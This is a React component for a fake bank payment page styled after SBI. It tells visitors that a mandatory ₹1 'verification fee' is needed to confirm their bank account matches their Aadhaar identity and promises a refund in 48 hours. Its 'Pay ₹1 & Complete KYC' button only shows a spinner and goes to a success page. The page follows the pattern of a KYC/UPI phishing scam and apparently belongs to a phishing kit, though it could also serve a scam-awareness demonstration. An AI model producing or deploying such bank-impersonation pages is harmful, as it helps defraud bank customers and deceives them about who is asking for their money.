import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { CreditCard, ShieldCheck, Wallet, ChevronRight, Info } from 'lucide-react';
import WarningBanner from '../components/WarningBanner';
import { motion } from 'framer-motion';

const PaymentPage: React.FC = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const handleVerify = () => {
    setLoading(true);
    setTimeout(() => {
      navigate('/success');
    }, 2500);
  };

  return (
    <div className="flex flex-col min-h-[calc(100vh-140px)]">
      <WarningBanner message="Payment Verification Required: Complete the secure nominal transaction to validate your bank account identity." />
      
      <div className="max-w-md mx-auto px-4 py-12 w-full flex-1">
        <motion.div 
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="glass-card p-0 border-b-4 border-b-sbi-blue overflow-hidden"
        >
          <div className="p-8 text-center bg-sbi-blue text-white">
            <h2 className="text-xl font-black uppercase tracking-tight mb-1">Final Validation</h2>
            <p className="text-[10px] text-sbi-light-blue font-bold uppercase tracking-widest opacity-80">Security Validation Required</p>
            
            <div className="mt-6 flex flex-col items-center">
                <div className="text-4xl font-black mb-1">₹1.00</div>
                <div className="text-[10px] font-bold uppercase tracking-widest bg-white/20 px-3 py-1 rounded-full">Nominal Verification Fee</div>
            </div>
          </div>

          <div className="p-8">
            <div className="space-y-6">
                <div className="flex items-start gap-3 bg-amber-50 p-4 rounded-xl border border-amber-100">
                    <Info className="w-5 h-5 text-amber-600 shrink-0 mt-0.5" />
                    <p className="text-xs font-medium text-amber-800 leading-relaxed">
                        This transaction is mandatory to verify that the bank account belongs to the primary Aadhaar holder. The amount will be refunded within 48 hours.
                    </p>
                </div>

                <div className="space-y-4">
                    <h3 className="text-[11px] font-black text-gray-400 uppercase tracking-widest ml-1">Payment Verification Method</h3>
                    
                    <button 
                      aria-label="Verify Bank via UPI"
                      className="w-full flex items-center justify-between p-4 border-2 border-sbi-blue bg-blue-50/50 rounded-xl transition-all"
                    >
                        <div className="flex items-center gap-4">
                            <div className="bg-white p-2 rounded-lg shadow-sm border border-gray-100">
                                <Wallet className="w-5 h-5 text-sbi-blue" />
                            </div>
                            <div className="text-left">
                                <p className="text-sm font-black text-slate-800">UPI / QR Scan</p>
                                <p className="text-[10px] text-gray-500 font-bold uppercase">Google Pay, PhonePe, Paytm</p>
                            </div>
                        </div>
                        <div className="w-5 h-5 rounded-full border-4 border-sbi-blue flex items-center justify-center">
                            <div className="w-2 h-2 rounded-full bg-sbi-blue"></div>
                        </div>
                    </button>

                    <button className="w-full flex items-center justify-between p-4 border-2 border-gray-100 hover:border-sbi-blue/30 rounded-xl transition-all group">
                        <div className="flex items-center gap-4">
                            <div className="bg-white p-2 rounded-lg shadow-sm border border-gray-100 group-hover:bg-sbi-blue/5 transition-colors">
                                <CreditCard className="w-5 h-5 text-sbi-blue" />
                            </div>
                            <div className="text-left">
                                <p className="text-sm font-black text-slate-800">Debit / ATM Card</p>
                                <p className="text-[10px] text-gray-500 font-bold uppercase">Visa, Mastercard, RuPay (Secure)</p>
                            </div>
                        </div>
                        <div className="w-5 h-5 rounded-full border-2 border-gray-200"></div>
                    </button>
                </div>

                <button 
                  onClick={handleVerify}
                  disabled={loading}
                  className="btn-primary w-full py-4 font-black text-base shadow-xl disabled:opacity-70 disabled:cursor-wait"
                >
                  {loading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      Processing Secure Payment...
                    </>
                  ) : (
                    <>
                      Pay ₹1 & Complete KYC
                      <ChevronRight className="w-5 h-5" />
                    </>
                  )}
                </button>
            </div>

            <div className="mt-8 flex items-center justify-center gap-6 opacity-40">
                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo.png" alt="UPI" className="h-4 grayscale" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" className="h-4 grayscale" />
                <ShieldCheck className="w-5 h-5 text-gray-800" />
            </div>
          </div>
        </motion.div>
      </div>
    </div>
  );
};

export default PaymentPage;
